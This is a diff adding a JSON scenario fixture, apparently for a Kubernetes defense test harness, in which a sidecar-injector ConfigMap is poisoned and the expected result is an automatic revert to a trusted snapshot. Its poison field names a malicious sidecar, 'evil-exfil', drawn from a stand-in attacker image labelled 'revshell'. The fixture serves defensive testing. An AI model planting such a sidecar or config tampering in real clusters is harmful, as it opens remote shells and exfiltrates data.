@@ -1,0 +1,33 @@
+{
+  "name": "ms-ex-sidecar-injection",
+  "mode": "lane",
+  "lane": "p5",
+  "actuator": "k8s-object-revert",
+  "event_type": "phorvex.attack.config-object",
+  "family": "config-object",
+  "desc": "Sidecar injection \u2014 operator-trusted mounted ConfigMap 'sidecar-injector-config' drifted from its trusted snapshot (MS-EX-sidecar-injection)",
+  "target": {
+    "ns": "p5-demo",
+    "prefix": "agent-cfg-",
+    "configmap": "sidecar-injector-config",
+    "pod_substr": "agent-cfg"
+  },
+  "arm": {
+    "poison": {
+      "inject": "true",
+      "sidecars": "log-forwarder,evil-exfil:public.ecr.aws/attacker/revshell:latest"
+    }
+  },
+  "oracle": {
+    "snapshot_annotation": "phorvex.ai/trusted-config-snapshot"
+  },
+  "event": {
+    "description": "MS-EX Sidecar injection: operator-trusted sidecar-injector-config ConfigMap drifted to enable injection of a malicious exfil sidecar.",
+    "threatLevel": "critical"
+  },
+  "defended": [
+    "k8s-object-revert"
+  ],
+  "expected": "DEFENDED",
+  "note": "Lane p5. Sidecar-injector template config surface. Modeled as an operator-trusted, volume-mounted ConfigMap in the agent-cfg fixture (the config surface k8s-object-revert governs). Arm = tamper sidecar-injector-config.data; detector event carries observed!=trusted sha + target-uid. DEFENDED when the p5 brain selects+actuates k8s-object-revert and sidecar-injector-config.data is restored to the operator trusted snapshot in place (no pod churn; neighbor trusted ConfigMaps untouched); reference staging brain frozen."
+}
